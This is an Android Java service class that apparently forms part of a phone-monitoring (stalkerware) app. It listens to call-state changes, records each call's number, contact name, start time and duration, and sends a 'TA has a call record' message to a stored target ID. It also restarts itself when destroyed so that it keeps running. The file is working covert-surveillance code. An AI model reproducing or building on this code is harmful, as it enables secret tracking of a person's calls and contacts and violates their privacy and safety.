package com.example.service;

import com.example.db.GeneralData;
import com.example.db.LocData;
import com.example.db.PhoneData;
import com.example.thread.SendMsgThread;
import com.example.utils.MyUtils;
import com.example.utils.SharedpreferencesUtil;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneService extends Service {
	private TelephonyManager tManager;
	private String str = "";
	private long time1 = 0;
	private long time2 = 0;

	private int type = 0;
	private String name;
	private String num;
	private long _time;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		System.out.println("Phoneservice oncreat");
//		getPhoneContacts();
		super.onCreate();
		tManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		PhoneStateListener listener = new PhoneStateListener() {

			@Override
			public void onCallStateChanged(int state, String incomingNumber) {

				switch (state) {
				// 无任何状态
				case TelephonyManager.CALL_STATE_IDLE:
					System.out.println("CALL_STATE_IDLE");
					time2 = System.currentTimeMillis();
					if (type != 0) {
						long t = time2 - time1;
						str = str + "通话时长:" + t + "毫秒";
						System.out.println(str);
						String content = type + "#" + num + "#" + name + "#"
								+ t + "#" + time1;
						GeneralData gd = new GeneralData("TA有一条通话信息", content,
								GeneralData.TYPE_PHONE,
								new SharedpreferencesUtil(
										getApplicationContext()).getTargetId());
						new SendMsgThread(gd, getApplicationContext()).start();
						// init
						str = "";
						time1 = 0;
						time2 = 0;
						type = 0;
						num = "";
						name = "";
						t = 0;
					}
					break;
				// 拨出
				case TelephonyManager.CALL_STATE_OFFHOOK:
					time1 = System.currentTimeMillis();
					System.out.println("CALL_STATE_OFFHOOK" + incomingNumber
							+ str);
					// 有用数据
					type = PhoneData.PHONE_OUT;
					num = incomingNumber;
					try {
						name = MyUtils.getContactNameByNumber(incomingNumber,
								getApplicationContext());
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						name = "unknown";
					}
					//
					break;
				// 来电铃响时
				case TelephonyManager.CALL_STATE_RINGING:
					time1 = System.currentTimeMillis();
					System.out.println("CALL_STATE_RINGING" + incomingNumber
							+ str);
					// 有用数据
					type = PhoneData.PHONE_IN;
					num = incomingNumber;
					try {
						name = MyUtils.getContactNameByNumber(incomingNumber,
								getApplicationContext());
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						name = "unknown";
					}
					//
					break;
				default:
					break;
				}

				super.onCallStateChanged(state, incomingNumber);
			}

		};
		tManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		flags = START_STICKY;
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		System.out.println("phoneservice ondestroy");
		// TODO Auto-generated method stub
		Intent service = new Intent(this, PhoneService.class);
		startService(service);
		super.onDestroy();
	}

}
